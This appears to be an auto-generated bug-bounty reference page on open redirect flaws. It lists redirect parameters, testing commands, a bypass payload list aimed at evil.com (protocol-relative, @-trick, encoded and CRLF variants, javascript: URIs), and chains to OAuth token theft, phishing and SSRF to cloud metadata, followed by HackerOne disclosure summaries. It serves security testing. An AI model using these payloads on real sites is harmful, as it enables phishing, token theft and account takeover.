# Open Redirect Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: — · Items: 0_

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Open redirect — server-side logic follows a user-controlled URL parameter without validating destination, enabling phishing, OAuth token theft, and XSS chains.

## Surface

- Redirect params in query string: `redirect=`, `next=`, `return=`, `url=`, `dest=`, `go=`, `target=`, `rurl=`, `returnUrl=`, `continue=`
- OAuth 2.0 `redirect_uri` — attacker-controlled destination for authorization codes/tokens
- Post-login redirect: `/login?next=/dashboard` — what happens if `next=//evil.com`?
- Password reset return URL: `/reset?token=abc&returnTo=/home`
- 302 responses after form submission — watch `Location:` header
- Single-page app route params: `/#/redirect?to=https://evil.com`
- Meta refresh tags and JS-driven redirects set from query params

## Test Approach

1. **Discover redirect params** with arjun against every endpoint that returns a 3xx:

   ```
   arjun -u https://target.com/login -m GET
   ```

2. **Baseline test** — send `redirect=https://evil.com`, check if `Location:` header or JS redirect goes there
3. **Try bypass variants** for regex/domain filters (see Payloads)
4. **Bulk test with gf + ffuf** — extract all redirect params from crawl output:

   ```
   cat urls.txt | gf redirect | ffuf -u FUZZ -w /dev/stdin -mr "evil\.com"
   ```

5. **Burp match/replace** — set rule: replace `redirect=https://target.com` with `redirect=//evil.com` across all in-scope requests; observe which flows allow it
6. **Test OAuth redirect_uri separately** — enumerate registered patterns, try path traversal:

   ```
   redirect_uri=https://target.com/callback/../../../evil.com
   redirect_uri=https://target.com/callback%0d%0aLocation:https://evil.com
   ```

7. **Escalate to XSS** — try `javascript:alert(document.domain)` in redirect param; some frameworks pass it to `window.location` unsanitized

## Tools

- **arjun** — parameter discovery on target URLs; `arjun -u https://target.com/login -m GET --stable`
- **gf** — grep known redirect param patterns from crawl output; `gf redirect urls.txt`
- **Burp match/replace** — swap redirect destinations in bulk across session; rule: `Request Header → Location value`
- **ffuf** — fuzz redirect param values with wordlist of bypass payloads; `-mr "Location: .*evil"` to flag hits

## Payloads / Probes

```
# Bare protocol-relative
//evil.com
//evil.com/path

# Double slash with encoded slash
\/\/evil.com
/\evil.com

# @-trick — browser resolves host as evil.com
https://target.com@evil.com
https://target.com%40evil.com

# Fragment trick — browser discards fragment on server, client follows
https://evil.com%23target.com
https://evil.com#target.com

# Encoded slash bypass
https:%2F%2Fevil.com
https:%2f%2fevil.com

# Double-encoded
https:%252F%252Fevil.com

# XSS via javascript: URI (if reflected to window.location)
javascript:alert(document.domain)
javascript://comment%0aalert(1)

# Path-based open redirect
/redirect?to=/evil.com
```

## Chain Opportunities

- **Open redirect → OAuth token theft** — set `redirect_uri` to open redirect URL on target, authorization code/token lands at attacker server: `redirect_uri=https://target.com/redirect?url=https://evil.com`
- **Open redirect → phishing** — trusted domain in URL bar until final redirect; high success rate against non-technical targets
- **Open redirect → SSRF bypass** — if server-side follows the redirect, use `//169.254.169.254` or internal hostnames
- **Open redirect + `javascript:` → XSS** — JS frameworks that call `window.location = param` without validation execute attacker JS in origin context
- **Open redirect → CSRF chain** — embed redirect in CSRF PoC to obscure final destination from victim

## Recent Intel

- **CVE-2023-24488** · Citrix ADC/Gateway open redirect via `login.do` and `oauth` endpoints · unauthenticated, used in phishing campaigns targeting Citrix SSO · CVSS 6.1
- **OAuth redirect_uri bypass patterns** · PortSwigger research 2024 · regex-based allowlists commonly bypassed via path traversal (`/callback/../attacker`), CRLF injection, and subdomain prefix tricks (`target.com.evil.com`)
- **HackerOne Hacktivity 2024** · open redirect in post-auth `returnTo` param chained with OAuth implicit flow → account takeover without any user interaction beyond clicking a link


## 2026-04-19 — H1 disclosures

### Open Redirect in Rocket.Chat

- **2026-04-10** · sev: Medium · bounty: undisclosed · cve: CVE-2026-22560
- Source: [hackerone.com/3418031](https://hackerone.com/reports/3418031) · Reporter: [@soohyun](https://hackerone.com/soohyun) · Team: [Rocket.Chat](https://hackerone.com/rocket_chat)
- CWE: Open Redirect

**What**

An open redirect vulnerability was identified in Rocket.Chat. The /_saml/sloRedirect/:provider endpoint included the redirect query string value directly in the Location header for a 302 redirect without any server-side validation. This issue was fixed in v8.4.0.

**PoC refs:** search `github.com/search?q=CVE-2026-22560` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-22560.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** Probe SAML SLO/SSO redirect endpoints (e.g. `/_saml/sloRedirect/`, `/_saml/ssoRedirect/`) with `?redirect=//evil.com` → check 302 `Location` reflects the attacker URL without validation.
**Nuclei:** `open-redirect`
**Pass-if:** Target doesn't use SAML or all SAML redirect params are validated against an allowlist.

---

### Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter

- **2026-03-12** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3599248](https://hackerone.com/reports/3599248) · Reporter: [@marioniangi](https://hackerone.com/marioniangi) · Team: [Lovable VDP](https://hackerone.com/lovable-vdp)
- CWE: Open Redirect

**What**

A bypass was discovered for a previously patched open redirect vulnerability on a web application. The original fix blocked certain payloads, but failed to account for path traversal sequences combined with double slashes. By supplying a specific redirect value, an attacker could still redirect authenticated users to arbitrary external domains. The vulnerability was caused by an incomplete denylist approach rather than proper validation.

**Hunt signal:** Fuzz any `redirect`/`next`/`return_to`/`url` param with path-traversal sequences: `//..//evil.com`, `/\..//evil.com`, `/%2f..%2f/evil.com`. Check if 302 Location resolves to external domain after normalization.
**Grep:** `rg -n 'redirect|next|return_to' src/ | rg -iv "url\.parse|new URL|allowlist|whitelist"`
**Nuclei:** `open-redirect`
**Pass-if:** Redirect validation uses proper URL parsing (e.g., `new URL().hostname` check) rather than denylist/string-matching.

---


## 2026-05-27 — H1 disclosures

### another liberapay member team twitter account broken Link Hijacking via Expired Twitter Account Link

- **2026-05-09** · sev: None · bounty: undisclosed
- Source: [hackerone.com/3723002](https://hackerone.com/reports/3723002) · Reporter: [@rox-11](https://hackerone.com/rox-11) · Team: [Liberapay](https://hackerone.com/liberapay)
- CWE: Open Redirect

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---

### Liberapay member team twitter account broken Link Hijacking via Expired Twitter Account Link

- **2026-05-09** · sev: — · bounty: undisclosed
- Source: [hackerone.com/3721519](https://hackerone.com/reports/3721519) · Reporter: [@rox-11](https://hackerone.com/rox-11) · Team: [Liberapay](https://hackerone.com/liberapay)
- CWE: Open Redirect

**What**

The profile of a Liberapay team member contained a link to an expired Twitter account, creating a broken link hijacking vulnerability. The expired Twitter account link was displayed on the member's Liberapay profile and donation page, falsely confirming to donors that the account was legitimate and verified.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---


## 2026-07-23 — H1 disclosures

### OAuth redirect uri validation bypass for :proxima_first_party_sync apps

- **2026-07-21** · sev: High · bounty: undisclosed · cve: CVE-2026-4296
- Source: [hackerone.com/3588801](https://hackerone.com/reports/3588801) · Reporter: [@ahacker1](https://hackerone.com/ahacker1) · Team: [GitHub](https://hackerone.com/github)
- CWE: Open Redirect

**What**

A vulnerability was identified in GitHub Enterprise Server that allowed an attacker to bypass OAuth redirect URI validation. The vulnerability was fixed in versions 3.20.1, 3.19.5, 3.18.8, 3.17.14, 3.16.17, 3.15.21, and 3.14.26. The vulnerability was reported through the GitHub Bug Bounty program.

**PoC refs:** search `github.com/search?q=CVE-2026-4296` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-4296.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---
